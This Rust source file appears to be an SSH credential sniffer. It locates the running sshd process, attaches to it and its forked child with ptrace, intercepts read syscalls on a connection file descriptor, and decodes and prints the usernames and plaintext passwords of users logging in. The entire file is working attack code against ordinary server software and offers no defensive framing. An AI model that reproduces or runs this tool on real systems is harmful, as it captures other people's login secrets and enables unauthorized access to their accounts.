#![allow(non_snake_case)]

use nix::{
            unistd::Pid, 
            sys::{ptrace::{self, AddressType, Options}, wait}
        };
use sysinfo::System;
use sysnames::Syscalls;
use byteorder::{WriteBytesExt, LittleEndian};



pub fn getPID() -> sysinfo::Pid {
  
    // Create sysinfo object and refresh to collect current os state
    let mut sys = System::new_all();
    sys.refresh_all();

    // Getting the SSHD process
    let sshd = sys.processes_by_name("sshd").take(1).next().unwrap();

    // SSHD PID
    sshd.pid()

}



pub fn checkTHREAD(pid: sysinfo::Pid) -> Pid {

    // Changing sysinfo::Pid as i32 passed over nix::unistd::Pid
    let pid = Pid::from_raw(pid.as_u32() as i32);

    // Attaching to SSHD
    ptrace::attach(pid).unwrap();

    // Wait for SIGTRAP signal
    wait::waitpid(pid, None).unwrap();

    // Tracing all options 
    ptrace::setoptions(pid, Options::all()).unwrap();

    // Continuing process
    ptrace::cont(pid, None).unwrap();

    // Wait for SIGTRAP signal
    wait::waitpid(pid, None).unwrap();

    // Getting child PID as i32
    let child_pid = ptrace::getevent(pid).unwrap() as i32;

    // Changing child i32 as nix::unistd::PID
    let child_pid = Pid::from_raw(child_pid);

    // Detach with no signal or die
    ptrace::detach(child_pid, None).unwrap();
    ptrace::detach(pid, None).unwrap();

    // Child PID
    child_pid

}



pub fn debugTHREAD(pid: Pid) {
    
    // Attaching to child
    ptrace::attach(pid).unwrap();

    // Wait for SIGTRAP signal
    wait::waitpid(pid, None).unwrap();

    // Counter to print Username and Password
    let mut count = 0;

    loop {
            
        // Invokes syscall
        ptrace::syscall(pid, None).unwrap();

        // Wait for SIGTRAP signal
        let _wait = wait::waitpid(pid, None).unwrap();

        match _wait {
            wait::WaitStatus::Exited(pid, status) => {
                                                        println!("\n\n{}Child {pid} exited with status {status}", "\t".repeat(5));
                                                        std::process::exit(1);
                                                    },
            _ => {
                    // Gettiing registers
                    let reg = ptrace::getregs(pid).unwrap();

                    // Getting and Checking for Username and Password
                    if (0..5).contains(&count) && Syscalls::name(reg.orig_rax as u64).unwrap() == "read" && reg.rdi as u16 == 6 && (6..).contains(&(reg.rdx as u16)) {
                        count += 1;
                        
                        if !decoder(pid, reg.rsi as AddressType).is_empty() && decoder(pid, reg.rsi as AddressType).is_ascii() {
                            println!("\n\n{} Username: {} Captured at: {:?}", "\t".repeat(5), decoder(pid, reg.rsi as AddressType), reg.rsi as AddressType);
                        }

                    } else if (5..).contains(&count) && Syscalls::name(reg.orig_rax as u64).unwrap() == "read" && reg.rdi as u16 == 6 && (6..).contains(&(reg.rdx as u16)) {
                        
                        if !decoder(pid, reg.rsi as ptrace::AddressType).is_empty() {
                            println!("\n{} Password: {} Captured at: {:?}", "\t".repeat(5), decoder(pid, reg.rsi as AddressType), reg.rsi as AddressType);
                        }

                    }
                }
        }
    }
}



pub fn decoder(pid: Pid, addr: AddressType) -> String {
    
    // Converting Addr to i64
    let mut addr = addr as i64;

    let mut string = String::new();
    let mut check = 0;

    'done: loop {

        let mut bytes: Vec<_> = Vec::new();
        let res = match ptrace::read(pid, addr as AddressType) {
                            Ok(s) => s,
                            Err(_) => break 'done,
                        };

        bytes.write_i64::<LittleEndian>(res).unwrap_or_else(|err| {
            panic!("Error to write {} as i64 LittleEndian: {}", res, err);
        });


        for b in bytes.clone() {
            
            if b != 0 {
                string.push(b as char);
            } else {
                continue;
            }

        }

        // Check for username and password
        if string.chars().nth(1) >= Some(check as u8 as char) {
            addr += 8;
            check += 1;
        } else {
            break;
        }

    }
     
    let string = string.split("ssh-connection").last().unwrap();
    string.trim().to_string()
}
